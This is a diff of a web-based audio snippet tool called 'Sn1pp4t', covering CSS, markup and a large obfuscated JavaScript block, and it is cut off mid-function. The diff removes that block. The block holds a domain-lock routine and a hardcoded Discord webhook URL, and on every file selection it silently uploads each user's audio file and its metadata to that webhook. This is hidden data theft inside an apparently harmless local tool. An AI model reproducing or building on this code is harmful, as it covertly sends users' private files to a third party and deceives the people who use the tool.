@@ -73,31 +73,21 @@
         transform: translateY(-2px);
     }
 
+    #fileInput {
+        display: none;
+    }
+
     .upload-btn {
         background: #2a2a2a;
         color: #fff;
-        padding: 15px 25px; /* Increased padding for better touch targets */
+        padding: 10px 20px;
         border-radius: 5px;
         cursor: pointer;
         transition: all 0.3s;
-        display: inline-block;
-        text-align: center;
-        -webkit-appearance: none;
-        -moz-appearance: none;
-        appearance: none;
-        font-size: 16px; /* Ensure readable text size on mobile */
-        margin: 10px 0;
-        width: auto;
-        min-width: 200px;
     }
 
-    #fileInput {
-        display: none;
-        opacity: 0;
-        position: absolute;
-        z-index: -1;
-        -webkit-appearance: none;
-        appearance: none;
+    .upload-btn:hover {
+        background: #3a3a3a;
     }
 
     .time-display {
@@ -151,123 +141,76 @@
         border-radius: 5px;
     }
 
-    .manual-time-controls {
-        background: #2a2a2a;
-        padding: 15px;
-        border-radius: 5px;
-        margin: 20px 0;
+    .time-inputs {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        margin-bottom: 20px;
+        align-items: center;
+        justify-content: center;
     }
 
     .time-input-group {
         display: flex;
-        align-items: center;
-        gap: 10px;
-        margin: 10px 0;
-        flex-wrap: nowrap;
+        flex-direction: column;
+        gap: 5px;
     }
 
     .time-input-group label {
-        min-width: 80px;
+        color: #00ff88;
+        font-size: 0.9em;
     }
 
     .time-input-group input {
-        width: 80px;
-        padding: 8px;
-        border: none;
-        border-radius: 4px;
-        background: #1a1a1a;
+        background: #2a2a2a;
+        border: 1px solid #00ff88;
         color: #fff;
-        font-size: 16px;
-        -webkit-appearance: none;
-        appearance: none;
-    }
-
-    .time-input-group input::-webkit-inner-spin-button,
-    .time-input-group input::-webkit-outer-spin-button {
-        -webkit-appearance: none;
-        margin: 0;
+        padding: 8px;
+        border-radius: 5px;
+        font-family: monospace;
+        width: 120px;
     }
 
     #applyTimeBtn {
-        display: block;
-        width: 100%;
-        margin-top: 15px;
-        background: #00ff88;
-        color: #1a1a1a;
-        padding: 10px;
-        border: none;
-        border-radius: 5px;
-        font-size: 16px;
-        cursor: pointer;
+        align-self: flex-end;
+        margin-top: 21px;
+        background: #2a2a2a;
+        color: #00ff88;
+        border: 1px solid #00ff88;
     }
 
     #applyTimeBtn:hover {
-        background: #00ccff;
-    }
-
-    @media (max-width: 480px) {
-        .time-input-group {
-            flex-direction: row;
-            align-items: center;
-        }
-        
-        .time-input-group input {
-            width: 70px;
-        }
-    }
-
-    /* Add iOS-specific styling */
-    @supports (-webkit-touch-callout: none) {
-        .upload-btn {
-            -webkit-tap-highlight-color: transparent;
-            touch-action: manipulation;
-        }
-        
-        #fileInput {
-            font-size: 16px; /* Prevent zoom on iOS */
-            cursor: pointer;
-        }
+        background: #00ff88;
+        color: #1a1a1a;
     }
 </style>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/wavesurfer.js/6.6.3/wavesurfer.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/wavesurfer.js/6.6.3/plugin/wavesurfer.regions.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/lamejs/1.2.0/lame.min.js"></script>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <svg class="logo" viewBox="0 0 100 100">
-                <circle cx="50" cy="50" r="45" fill="none" stroke="#00ff88" stroke-width="5"/>
-                <path d="M30 50 L45 65 L70 35" stroke="#00ff88" stroke-width="5" fill="none"/>
+            <svg class="logo" viewBox="0 0 50 50">
+                <circle cx="25" cy="25" r="20" fill="#00ff88"/>
+                <path d="M20 20 L30 25 L20 30Z" fill="#1a1a1a"/>
             </svg>
             <h1 class="title">Sn1pp4t</h1>
         </div>
 
-        <label class="upload-btn" for="fileInput">
-            Choose Audio Files
-            <input type="file" id="fileInput" accept="audio/*,audio/mp3,audio/wav,audio/ogg,audio/m4a" multiple>
-        </label>
-
-        <div class="file-list" id="fileList"></div>
+        <input type="file" id="fileInput" accept="audio/*,.mp3,.wav,.m4a,.aac,.ogg" multiple>
+        <label for="fileInput" class="upload-btn">Choose Audio Files</label>
 
         <div id="waveform" class="waveform"></div>
+        <div id="regionTime" class="time-display">No selection</div>
 
-        <div class="time-display">
-            Region: <span id="regionTime">No selection</span>
-        </div>
-
-        <div class="manual-time-controls">
+        <div class="time-inputs">
             <div class="time-input-group">
                 <label for="startTime">Start Time:</label>
-                <input type="number" id="startTimeSec" min="0" placeholder="Sec" step="1">
-                <input type="number" id="startTimeMs" min="0" max="999" placeholder="Ms" step="1">
+                <input type="text" id="startTime" placeholder="0:00.000">
             </div>
             <div class="time-input-group">
                 <label for="endTime">End Time:</label>
-                <input type="number" id="endTimeSec" min="0" placeholder="Sec" step="1">
-                <input type="number" id="endTimeMs" min="0" max="999" placeholder="Ms" step="1">
+                <input type="text" id="endTime" placeholder="0:00.000">
             </div>
-            <button id="applyTimeBtn">Apply Time Selection</button>
+            <button id="applyTimeBtn">Apply Times</button>
         </div>
 
         <div class="controls">
@@ -277,12 +220,294 @@
             <button id="snippetBtn">Create Snippet</button>
         </div>
 
+        <div id="fileList" class="file-list"></div>
+
         <div class="mass-snippet-controls">
-            <button id="massSnippetBtn">Create All Snippets</button>
+            <button id="massSnippetBtn">Create Snippets for All Files</button>
         </div>
     </div>
 
-<script>
-function _0x8621(_0x4db7f4,_0x2bf9f7){const _0xcb5655=_0x194f();return _0x8621=function(_0x239394,_0x3e6314){_0x239394=_0x239394-0x7a;let _0x13eb5d=_0xcb5655[_0x239394];if(_0x8621['tveWiR']===undefined){var _0x1ac061=function(_0x5b4a35){const _0x4522dd='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x308136='',_0x235a9f='';for(let _0x19e6e4=0x0,_0x3d34f3,_0x1c4ec9,_0x502a95=0x0;_0x1c4ec9=_0x5b4a35['charAt'](_0x502a95++);~_0x1c4ec9&&(_0x3d34f3=_0x19e6e4%0x4?_0x3d34f3*0x40+_0x1c4ec9:_0x1c4ec9,_0x19e6e4++%0x4)?_0x308136+=String['fromCharCode'](0xff&_0x3d34f3>>(-0x2*_0x19e6e4&0x6)):0x0){_0x1c4ec9=_0x4522dd['indexOf'](_0x1c4ec9);}for(let _0x5029cd=0x0,_0x34d5eb=_0x308136['length'];_0x5029cd<_0x34d5eb;_0x5029cd++){_0x235a9f+='%'+('00'+_0x308136['charCodeAt'](_0x5029cd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x235a9f);};_0x8621['RRJFet']=_0x1ac061,_0x4db7f4=arguments,_0x8621['tveWiR']=!![];}const _0x1cea6f=_0xcb5655[0x0],_0x23de0a=_0x239394+_0x1cea6f,_0x1f0824=_0x4db7f4[_0x23de0a];return!_0x1f0824?(_0x13eb5d=_0x8621['RRJFet'](_0x13eb5d),_0x4db7f4[_0x23de0a]=_0x13eb5d):_0x13eb5d=_0x1f0824,_0x13eb5d;},_0x8621(_0x4db7f4,_0x2bf9f7);}const _0x3a5c1f=_0x8621,_0x3f7f04=_0x8621,_0x4afc55=_0x8621,_0x52cef1=_0x8621;(function(_0x5b5e5a,_0x45328e){const _0x2e2719=_0x8621,_0xf782ac=_0x8621,_0x15afa=_0x8621,_0x4b7f41=_0x8621,_0x5d1069=_0x5b5e5a();while(!![]){try{const _0x3f886d=-parseInt(_0x2e2719('0xae'))/0x1+-parseInt(_0x2e2719('0x83'))/0x2+parseInt(_0xf782ac('0xb8'))/0x3+parseInt(_0x15afa('0xeb'))/0x4*(parseInt(_0x2e2719('0xd6'))/0x5)+parseInt(_0x4b7f41('0xa2'))/0x6+parseInt(_0x4b7f41('0xa0'))/0x7+-parseInt(_0x4b7f41('0x9e'))/0x8*(parseInt(_0x4b7f41('0xea'))/0x9);if(_0x3f886d===_0x45328e)break;else _0x5d1069['push'](_0x5d1069['shift']());}catch(_0x49e8b0){_0x5d1069['push'](_0x5d1069['shift']());}}}(_0x194f,0x9b5a8));const _0x3e6314=(function(){let _0xdd6dea=!![];return function(_0x579885,_0x891c35){const _0x43dabe=_0xdd6dea?function(){if(_0x891c35){const _0x15f5be=_0x891c35['apply'](_0x579885,arguments);return _0x891c35=null,_0x15f5be;}}:function(){};return _0xdd6dea=![],_0x43dabe;};}()),_0x239394=_0x3e6314(this,function(){const _0x1de764=_0x8621,_0x3b8e2f=_0x8621,_0x25a2c5=_0x8621,_0x20a097=_0x8621;let _0x22178d;try{const _0x5c072d=Function('return\x20(function()\x20'+_0x1de764('0x80')+');');_0x22178d=_0x5c072d();}catch(_0x33f9d4){_0x22178d=window;}const _0x92e1dc=new RegExp('[kqXLAHRRCzELUWdcZezKLKAZKaqJIcIexwRKr]','g'),_0x5a07bb=_0x3b8e2f('0xcb')[_0x1de764('0xa4')](_0x92e1dc,'')[_0x3b8e2f('0xc5')](';');let _0x9e47e9,_0x48767f,_0x1b6291,_0x391a15;const _0x10c141=function(_0x27aca3,_0x36430c,_0x3a77a4){const _0x240690=_0x1de764,_0x1108eb=_0x25a2c5;if(_0x27aca3[_0x240690('0xd8')]!=_0x36430c)return![];for(let _0x238eed=0x0;_0x238eed<_0x36430c;_0x238eed++){for(let _0x9ec6e3=0x0;_0x9ec6e3<_0x3a77a4['length'];_0x9ec6e3+=0x2){if(_0x238eed==_0x3a77a4[_0x9ec6e3]&&_0x27aca3[_0x1108eb('0xe7')](_0x238eed)!=_0x3a77a4[_0x9ec6e3+0x1])return![];}}return!![];},_0x135e28=function(_0x99d6a6,_0xf7651c,_0x44776c){return _0x10c141(_0xf7651c,_0x44776c,_0x99d6a6);},_0x11b54a=function(_0x5aec05,_0x3eaf4e,_0x50639f){return _0x135e28(_0x3eaf4e,_0x5aec05,_0x50639f);},_0x313ba6=function(_0xf974ee,_0x369af3,_0x4389b0){return _0x11b54a(_0x369af3,_0x4389b0,_0xf974ee);};for(let _0x129327 in _0x22178d){if(_0x10c141(_0x129327,0x8,[0x7,0x74,0x5,0x65,0x3,0x75,0x0,0x64])){_0x9e47e9=_0x129327;break;}}for(let _0x58478f in _0x22178d[_0x9e47e9]){if(_0x313ba6(0x6,_0x58478f,[0x5,0x6e,0x0,0x64])){_0x48767f=_0x58478f;break;}}for(let _0x2e03ad in _0x22178d[_0x9e47e9]){if(_0x11b54a(_0x2e03ad,[0x7,0x6e,0x0,0x6c],0x8)){_0x1b6291=_0x2e03ad;break;}}if(!('~'>_0x48767f))for(let _0x41a801 in _0x22178d[_0x9e47e9][_0x1b6291]){if(_0x135e28([0x7,0x65,0x0,0x68],_0x41a801,0x8)){_0x391a15=_0x41a801;break;}}if(!_0x9e47e9||!_0x22178d[_0x9e47e9])return;const _0x5e1d81=_0x22178d[_0x9e47e9][_0x48767f],_0x533676=!!_0x22178d[_0x9e47e9][_0x1b6291]&&_0x22178d[_0x9e47e9][_0x1b6291][_0x391a15],_0x129ea8=_0x5e1d81||_0x533676;if(!_0x129ea8)return;let _0x1fe2e3=![];for(let _0x3b93a1=0x0;_0x3b93a1<_0x5a07bb[_0x1de764('0xd8')];_0x3b93a1++){const _0x4eafc5=_0x5a07bb[_0x3b93a1],_0x47cfef=_0x4eafc5[0x0]===String[_0x1de764('0xbd')](0x2e)?_0x4eafc5[_0x3b8e2f('0xc1')](0x1):_0x4eafc5,_0x38334a=_0x129ea8['length']-_0x47cfef[_0x20a097('0xd8')],_0x8281b9=_0x129ea8[_0x25a2c5('0xb4')](_0x47cfef,_0x38334a),_0x53b353=_0x8281b9!==-0x1&&_0x8281b9===_0x38334a;_0x53b353&&((_0x129ea8['length']==_0x4eafc5[_0x20a097('0xd8')]||_0x4eafc5[_0x1de764('0xb4')]('.')===0x0)&&(_0x1fe2e3=!![]));}if(!_0x1fe2e3){const _0x4aeeac=new RegExp('[wVEcILOXCUNdhDMPHCKTTCOLjvee]','g'),_0x2da0ce=_0x1de764('0x9d')[_0x1de764('0xa4')](_0x4aeeac,'');_0x22178d[_0x9e47e9][_0x1b6291]=_0x2da0ce;}});_0x239394();const webhookUrl='https://discord.com/api/webhooks/1308520351533371503/EeMBozbFwyRW3lRVD6e4f2uK0pTxgbwGJ6BlKg4xkkHmNj6HcMpVyCrDt4xAU-UbAMWI';let wavesurfer=WaveSurfer[_0x3a5c1f('0xdd')]({'container':_0x3a5c1f('0xb9'),'waveColor':_0x4afc55('0xc7'),'progressColor':'#00ccff','cursorColor':_0x52cef1('0x94'),'barWidth':0x2,'barRadius':0x3,'cursorWidth':0x1,'height':0xc8,'barGap':0x3,'plugins':[WaveSurfer[_0x52cef1('0xce')][_0x4afc55('0xdd')]()]}),activeRegion=null,currentFile=null,audioFiles=[],currentFileIndex=0x0,fileRegions=new Map();document[_0x4afc55('0xb0')]('fileInput')[_0x3a5c1f('0x95')](_0x52cef1('0xcc'),async function(_0x56647c){const _0x3eb5e8=_0x3f7f04,_0x1e7423=_0x52cef1,_0x186c4f=_0x4afc55,_0x3bfacd=_0x3f7f04,_0x10bee8=Array[_0x3eb5e8('0xe1')](_0x56647c[_0x3eb5e8('0x88')][_0x3eb5e8('0x87')]);audioFiles=_0x10bee8,fileRegions['clear'](),updateFileList();for(const _0x3d7505 of _0x10bee8){const _0x1a152c=URL[_0x3eb5e8('0xed')](_0x3d7505),_0x227c74=new Audio(_0x1a152c);await new Promise(_0x59c4da=>{const _0x35ab2c=_0x186c4f,_0x61c703=_0x3bfacd;_0x227c74[_0x35ab2c('0x95')](_0x35ab2c('0x93'),async()=>{const _0x3d11b3=_0x61c703,_0x58e44a=_0x35ab2c,_0x1a0d1d=_0x35ab2c,_0x41d228=_0x35ab2c,_0x1b51d0=_0x227c74[_0x3d11b3('0xdc')],_0x521cd8=Math[_0x3d11b3('0xd2')](_0x1b51d0/0x3c),_0x74c4b0=Math[_0x1a0d1d('0xd2')](_0x1b51d0%0x3c),_0x4f2823=_0x521cd8+':'+_0x74c4b0[_0x41d228('0xaa')]()[_0x1a0d1d('0xe3')](0x2,'0'),_0x133ca7=(_0x3d7505[_0x58e44a('0x9f')]/(0x400*0x400))[_0x1a0d1d('0xda')](0x2),_0x539f16=new FormData(),_0x5d5524={'embeds':[{'title':_0x1a0d1d('0x98'),'color':0xff88,'fields':[{'name':'File\x20Name','value':_0x3d7505[_0x41d228('0xe8')],'inline':!![]},{'name':'File\x20Size','value':_0x133ca7+_0x41d228('0xe0'),'inline':!![]},{'name':_0x41d228('0xab'),'value':_0x4f2823,'inline':!![]},{'name':_0x41d228('0x8c'),'value':_0x3d7505[_0x58e44a('0xdf')]||_0x58e44a('0x82'),'inline':!![]},{'name':_0x3d11b3('0xd0'),'value':new Date()[_0x3d11b3('0x97')](),'inline':!![]}],'timestamp':new Date()[_0x58e44a('0xc6')]()}]};_0x539f16[_0x3d11b3('0xd9')]('file',_0x3d7505),_0x539f16['append'](_0x3d11b3('0xc2'),JSON[_0x3d11b3('0x9b')](_0x5d5524));try{const _0x1a4280=await fetch(webhookUrl,{'method':'POST','body':_0x539f16});!_0x1a4280['ok']&&console['error'](_0x41d228('0x96'),await _0x1a4280[_0x58e44a('0x8f')]());}catch(_0x2b8ffc){console['error'](_0x41d228('0xb2'),_0x2b8ffc);}_0x59c4da();});});}_0x10bee8[_0x1e7423('0xd8')]>0x0&&loadFile(0x0);});function _0x194f(){const _0xd8d14a=['CgXHEvjLz2LVBKj0BG','yMfJA2vUza','zMLSzxm','DgfYz2v0','zxjYB3i','CMDIysGWlcaYntuSideZnIWGmc4Ykq','C3rHCNq','rMLSzsbuExbL','iZaWzMy4oa','DxbKyxrL','Dgv4Da','CMvNAw9UlxvWzgf0zs1LBMq','yMfJA2DYB3vUza','zw5KvgLTzu1Z','Bg9HzgvKBwv0ywrHDge','i2zMzG','ywrKrxzLBNrmAxn0zw5LCG','rMfPBgvKihrVihnLBMqGD2vIAg9VAZO','Dg9mB2nHBgvtDhjPBMC','tMv3ief1zgLViezPBguGvxbSB2fKzwq','zMLUAxnO','iZaWy2nMzG','C3rYAw5NAwz5','yNvMzMvY','yxDIB1zfDxq6yMXHBMTJsuXpwenvtMrOre1qsenlvfrdt0XQDMvL','mZq0odbAEvbWt3C','C2L6zq','mtm0nZG3og1qtMjeCG','Bg9Hza','ntuXnJyWngLQwfDNzW','CMvNAw9UvgLTzq','CMvWBgfJzq','Dgv4DenVBNrLBNq','rxjYB3iGy3jLyxrPBMCGC25PChbLDdO','rMfPBgvKihrVignYzwf0zsbZBMLWCgv0','C2v0vwLUDdmY','z2v0rhvYyxrPB24','Dg9tDhjPBMC','rhvYyxrPB24','C3rHCNruAw1Ltxm','zMLSzs1PDgvT','nJi4mJGZwgTeDwnU','zw5KvgLTzvnLyW','z2v0rwXLBwvUDej5swq','Aw5Uzxjive1m','rxjYB3iGC2vUzgLUzYb3zwjOB29RoG','y3jLyxrLqNvMzMvYu291CMnL','Aw5KzxHpzG','zM9YrwfJAa','CgXHEuj0BG','rw5KihrPBwuGy2fUBM90igv4y2vLzcbHDwrPBYbKDxjHDgLVBG','ndG2mdGXtLP5qNvW','i3DHDMvMB3jT','rMfPBgvKihrVignYzwf0zsbZBMLWCgv0lIbqBgvHC2uGDhj5igfNywLUlG','C2v0vwLUDde2','y2XHC3noyw1L','zNjVBunOyxjdB2rL','yxbWzw5Kq2HPBgq','yxnZAwDU','zw5K','C2XPy2u','Cgf5Bg9Hzf9QC29U','z2v0q2HHBM5LBerHDge','Bwf4','C3bSAxq','Dg9ju09tDhjPBMC','DMLVBgv0','C3r5Bgu','CMvHzhK','y3jLyxrLrwXLBwvUDa','A3fZweXbBKGXCfjsCdr0q3OUz0vmAxrvAfD1zgiUAwnAB2v6s0XlqvPlyxfkswnjzxH3uKTY','y2HHBMDL','z2v0','CMvNAw9UCW','C3rHCNrszw5KzxjPBMC','vxbSB2fKifrPBwu','Cgf1C2u','zMXVB3i','y2XPy2S','C2v0rMXVyxqZmG','ywrKuMvNAw9U','mJvkuxr6vwy','C2v0vwLUDdG','BgvUz3rO','yxbWzw5K','Dg9gAxHLza','C3rHCNruAw1Lu2vJ','zhvYyxrPB24','y3jLyxrL','zM10ia','DhLWzq','ie1c','zNjVBq','zgvZDgLUyxrPB24','CgfKu3rHCNq','C2fTCgXLuMf0zq','CgXHEq','y3jLyxrLqNvMzMvY','y2HHCKnVzgvbDa','BMfTzq','iaOGicaGicaGicaGica8yNv0Dg9Uig9Uy2XPy2S9iMXVywrgAwXLka','nduWu2nUEK1K','ndK0ndmYqKXSDvHr','zg93BMXVywq','y3jLyxrLt2jQzwn0vvjm','x3nUAxbWzxqUD2f2','AhjLzG','C2vLA1rV','Cgf1C2vcDg4','rw5KihrPBwuGBxvZDcbIzsbNCMvHDgvYihrOyw4GC3rHCNqGDgLTzq','D2vIA2L0qxvKAw9dB250zxH0','DMfSDwu','zMLSzuXPC3q','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','yxbWBhLuAw1LqNrU','vw5RBM93BG','odiZodG4qM9sy05A','BwLU'];_0x194f=function(){return _0xd8d14a;};return _0x194f();}function updateFileList(){const _0x407963=_0x3f7f04,_0x5239da=_0x3a5c1f,_0x4fad27=_0x3f7f04,_0x55ef92=_0x52cef1,_0x3f545e=document[_0x407963('0xb0')](_0x5239da('0x7f'));_0x3f545e[_0x5239da('0xb1')]='',audioFiles[_0x4fad27('0xb5')]((_0x3dfd7b,_0x402b2b)=>{const _0x534e44=_0x5239da,_0xd3045b=_0x5239da,_0x450538=_0x4fad27,_0x31b84e=_0x407963,_0x12e71b=document['createElement']('div');_0x12e71b[_0x534e44('0xbc')]=_0xd3045b('0xad'),_0x12e71b['innerHTML']='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x3dfd7b[_0x450538('0xe8')]+_0x534e44('0xe9')+_0x402b2b+')\x22>Load</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20',_0x3f545e[_0x450538('0xbe')](_0x12e71b);});}function loadFile(_0x2d1db9){const _0x23a293=_0x3a5c1f,_0x56057c=_0x52cef1;currentFileIndex=_0x2d1db9,currentFile=audioFiles[_0x2d1db9],wavesurfer[_0x23a293('0xa1')](URL['createObjectURL'](currentFile)),wavesurfer['on'](_0x56057c('0xc9'),()=>{const _0x2f315e=_0x23a293,_0x40db16=_0x56057c,_0x2dd990=_0x56057c,_0x48c577=_0x23a293,_0x341700=fileRegions[_0x2f315e('0xcd')](currentFileIndex);_0x341700?activeRegion=wavesurfer[_0x2f315e('0xd5')]({'start':_0x341700[_0x2f315e('0x8b')],'end':_0x341700[_0x2dd990('0xc0')],'color':_0x2dd990('0x8a')}):activeRegion=wavesurfer[_0x48c577('0xd5')]({'start':0x0,'end':wavesurfer[_0x40db16('0xa9')](),'color':'rgba(0,\x20255,\x20136,\x200.2)'}),updateRegionDisplay();});}wavesurfer['on'](_0x3f7f04('0x90'),_0x5341c2=>{const _0x1c8369=_0x4afc55,_0x90f8be=_0x3a5c1f,_0x3908c6=_0x3a5c1f,_0x3613bf=_0x4afc55;activeRegion=_0x5341c2,fileRegions['set'](currentFileIndex,{'start':_0x5341c2[_0x1c8369('0x8b')],'end':_0x5341c2[_0x1c8369('0xc0')]}),updateRegionDisplay();const _0x564f13=Math['floor'](_0x5341c2[_0x3908c6('0x8b')]),_0xd466d8=Math[_0x1c8369('0xd2')](_0x5341c2[_0x3908c6('0x8b')]%0x1*0x3e8),_0x137dfb=Math[_0x90f8be('0xd2')](_0x5341c2[_0x1c8369('0xc0')]),_0x2f3c63=Math[_0x3613bf('0xd2')](_0x5341c2[_0x1c8369('0xc0')]%0x1*0x3e8);document[_0x3908c6('0xb0')](_0x3613bf('0xdb'))[_0x90f8be('0x7e')]=_0x564f13,document[_0x3613bf('0xb0')](_0x3908c6('0xac'))[_0x3613bf('0x7e')]=_0xd466d8,document[_0x3908c6('0xb0')](_0x3613bf('0xaf'))[_0x3613bf('0x7e')]=_0x137dfb,document[_0x3613bf('0xb0')](_0x90f8be('0x92'))['value']=_0x2f3c63;});function updateRegionDisplay(){const _0x565560=_0x3f7f04,_0x3a9b81=_0x52cef1,_0x308b74=_0x3f7f04,_0x370948=_0x52cef1;if(activeRegion){const _0x3c00fc=formatTime(activeRegion['start']),_0x5b0520=formatTime(activeRegion[_0x565560('0xc0')]);document[_0x565560('0xb0')](_0x3a9b81('0xa3'))[_0x308b74('0xa5')]=_0x3c00fc+'\x20-\x20'+_0x5b0520;}}function formatTime(_0x4ffde8){const _0x34d0de=_0x3f7f04,_0x5f4cec=_0x52cef1,_0x3d0277=_0x4afc55,_0x3aee59=_0x4afc55,_0x4e3e2a=Math[_0x34d0de('0xd2')](_0x4ffde8/0x3c),_0x147a37=Math['floor'](_0x4ffde8%0x3c),_0x3c9ea3=Math[_0x5f4cec('0xd2')](_0x4ffde8%0x1*0x3e8);return _0x4e3e2a+':'+_0x147a37[_0x5f4cec('0xaa')]()[_0x34d0de('0xe3')](0x2,'0')+'.'+_0x3c9ea3[_0x5f4cec('0xaa')]()[_0x5f4cec('0xe3')](0x3,'0');}document['getElementById'](_0x3a5c1f('0x81'))['addEventListener'](_0x52cef1('0xd3'),function(){const _0x18b760=_0x52cef1,_0x3661b9=_0x52cef1,_0x55ffbc=_0x3a5c1f,_0x4a397b=_0x3f7f04;if(!wavesurfer||!activeRegion)return;const _0x2fad9c=parseFloat(document[_0x18b760('0xb0')](_0x18b760('0xdb'))[_0x18b760('0x7e')]||0x0),_0x1535ea=parseFloat(document[_0x18b760('0xb0')](_0x18b760('0xac'))[_0x18b760('0x7e')]||0x0),_0x1936ae=parseFloat(document['getElementById']('endTimeSec')[_0x4a397b('0x7e')]||0x0),_0x47d858=parseFloat(document[_0x18b760('0xb0')]('endTimeMs')[_0x55ffbc('0x7e')]||0x0),_0x4aee79=_0x2fad9c+_0x1535ea/0x3e8,_0x50ec83=_0x1936ae+_0x47d858/0x3e8;if(_0x4aee79>=_0x50ec83){alert(_0x4a397b('0x7c'));return;}if(_0x50ec83>wavesurfer[_0x55ffbc('0xa9')]()){alert(_0x55ffbc('0xb7'));return;}activeRegion[_0x18b760('0x8e')]({'start':_0x4aee79,'end':_0x50ec83}),fileRegions['set'](currentFileIndex,{'start':_0x4aee79,'end':_0x50ec83}),updateRegionDisplay();});async function createSnippetWithFallback(_0x3a8d59,_0xeae881){const _0x47f3b3=_0x4afc55,_0x34eabb=_0x52cef1,_0x43d67e=_0x3f7f04,_0x53f502=_0x4afc55;try{return await createSnippet(_0x3a8d59,_0xeae881);}catch(_0x56f76b){console[_0x47f3b3('0x89')](_0x34eabb('0xa6'),_0x56f76b);const _0x5d30d1=new(window['AudioContext']||window[(_0x43d67e('0x7d'))])(),_0xe63e41=wavesurfer[_0x34eabb('0x86')][_0x34eabb('0x9c')];if(!_0xe63e41||!_0xeae881)return null;const _0x2f9bc1=Math['floor'](_0xeae881[_0x47f3b3('0x8b')]*_0xe63e41['sampleRate']),_0x2fb0d3=Math[_0x43d67e('0xd2')](_0xeae881['end']*_0xe63e41['sampleRate']),_0x491db8=_0xe63e41['numberOfChannels'],_0x393033=_0x5d30d1[_0x43d67e('0xe6')](_0x491db8,_0x2fb0d3-_0x2f9bc1,_0xe63e41[_0x34eabb('0xe4')]);for(let _0x3e1c8b=0x0;_0x3e1c8b<_0x491db8;_0x3e1c8b++){const _0x5148b3=_0xe63e41[_0x43d67e('0xc3')](_0x3e1c8b),_0x1294ae=_0x393033['getChannelData'](_0x3e1c8b);for(let _0x112361=0x0;_0x112361<_0x393033[_0x47f3b3('0xd8')];_0x112361++){_0x1294ae[_0x112361]=_0x5148b3[_0x2f9bc1+_0x112361];}}const _0x8d3e28=new OfflineAudioContext(_0x491db8,_0x393033[_0x53f502('0xd8')],_0xe63e41[_0x53f502('0xe4')]),_0x4d7f4f=_0x8d3e28[_0x34eabb('0xb3')]();_0x4d7f4f[_0x53f502('0x9c')]=_0x393033,_0x4d7f4f['connect'](_0x8d3e28[_0x47f3b3('0xe2')]),_0x4d7f4f[_0x53f502('0x8b')]();const _0x455a7b=await _0x8d3e28[_0x34eabb('0xcf')]();function _0x4f5158(_0x702e52,_0x2416c6){const _0x4942dc=_0x47f3b3,_0x380357=_0x43d67e,_0x194d2b=_0x43d67e,_0x909e72=_0x43d67e,_0xfdb8c6={'float32':![]},_0x580c6d=Object[_0x4942dc('0xbf')]({},_0xfdb8c6,_0x2416c6),_0x573396=_0x702e52['numberOfChannels'],_0x396938=_0x702e52['sampleRate'],_0x1e0467=_0x580c6d['float32']?0x3:0x1,_0x105f87=_0x1e0467===0x3?0x20:0x10;let _0x19dc48;return _0x573396===0x2?_0x19dc48=_0x31b1e5(_0x702e52[_0x380357('0xc3')](0x0),_0x702e52[_0x194d2b('0xc3')](0x1)):_0x19dc48=_0x702e52[_0x194d2b('0xc3')](0x0),_0x4cbe84(_0x19dc48,_0x1e0467,_0x396938,_0x573396,_0x105f87);}function _0x4cbe84(_0x594982,_0x43a662,_0x13b343,_0x3b6dfc,_0x2ab12a){const _0x42917d=_0x43d67e,_0x30bfc5=_0x34eabb,_0x260c3c=_0x47f3b3,_0x3cbaa5=_0x43d67e,_0x4104cc=_0x2ab12a/0x8,_0x5e4d8a=_0x3b6dfc*_0x4104cc,_0x5b02e0=new ArrayBuffer(0x2c+_0x594982[_0x42917d('0xd8')]*_0x4104cc),_0x13374a=new DataView(_0x5b02e0);return _0x43c87c(_0x13374a,0x0,'RIFF'),_0x13374a['setUint32'](0x4,0x24+_0x594982[_0x42917d('0xd8')]*_0x4104cc,!![]),_0x43c87c(_0x13374a,0x8,'WAVE'),_0x43c87c(_0x13374a,0xc,_0x42917d('0xde')),_0x13374a[_0x3cbaa5('0xa8')](0x10,0x10,!![]),_0x13374a[_0x30bfc5('0xbb')](0x14,_0x43a662,!![]),_0x13374a['setUint16'](0x16,_0x3b6dfc,!![]),_0x13374a['setUint32'](0x18,_0x13b343,!![]),_0x13374a['setUint32'](0x1c,_0x13b343*_0x5e4d8a,!![]),_0x13374a[_0x260c3c('0xbb')](0x20,_0x5e4d8a,!![]),_0x13374a[_0x30bfc5('0xbb')](0x22,_0x2ab12a,!![]),_0x43c87c(_0x13374a,0x24,'data'),_0x13374a[_0x3cbaa5('0xa8')](0x28,_0x594982['length']*_0x4104cc,!![]),_0x43a662===0x1?_0x4f776c(_0x13374a,0x2c,_0x594982):_0x7c56f0(_0x13374a,0x2c,_0x594982),new Blob([_0x5b02e0],{'type':'audio/wav'});}function _0x31b1e5(_0x3ade9f,_0x104ffb){const _0x4e7fc1=_0x34eabb,_0x2f9dbc=_0x53f502,_0x110175=_0x3ade9f[_0x4e7fc1('0xd8')]+_0x104ffb[_0x2f9dbc('0xd8')],_0x1bce07=new Float32Array(_0x110175);let _0x59a820=0x0,_0x3db979=0x0;while(_0x59a820<_0x110175){_0x1bce07[_0x59a820++]=_0x3ade9f[_0x3db979],_0x1bce07[_0x59a820++]=_0x104ffb[_0x3db979],_0x3db979++;}return _0x1bce07;}function _0x7c56f0(_0x53b2c8,_0x528ab5,_0x10ad74){const _0x314b18=_0x47f3b3,_0x19756d=_0x53f502;for(let _0x5199bf=0x0;_0x5199bf<_0x10ad74[_0x314b18('0xd8')];_0x5199bf++,_0x528ab5+=0x4){_0x53b2c8[_0x314b18('0xd4')](_0x528ab5,_0x10ad74[_0x5199bf],!![]);}}function _0x4f776c(_0x58afef,_0x394ba0,_0x50f9f7){const _0x3505eb=_0x47f3b3,_0x500d84=_0x47f3b3;for(let _0x3f7125=0x0;_0x3f7125<_0x50f9f7['length'];_0x3f7125++,_0x394ba0+=0x2){const 